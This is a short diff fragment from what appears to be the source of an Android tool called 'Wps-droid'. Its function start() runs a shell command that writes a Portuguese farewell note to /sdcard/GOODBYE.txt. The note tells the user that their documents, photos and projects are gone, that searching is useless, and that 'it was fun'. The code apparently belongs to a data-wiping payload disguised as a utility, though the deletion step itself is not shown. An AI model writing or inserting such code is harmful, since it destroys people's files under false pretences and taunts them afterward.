@@ -32,4 +32,3 @@ def start():
         run('echo "Seus documentos, fotos e projetos sumiram.
     Não adianta buscar, nada mais existe.
     Foi divertido." > /sdcard/GOODBYE.txt',shell=shell_flag)
-~/.../Wps-droid/sorce-code $
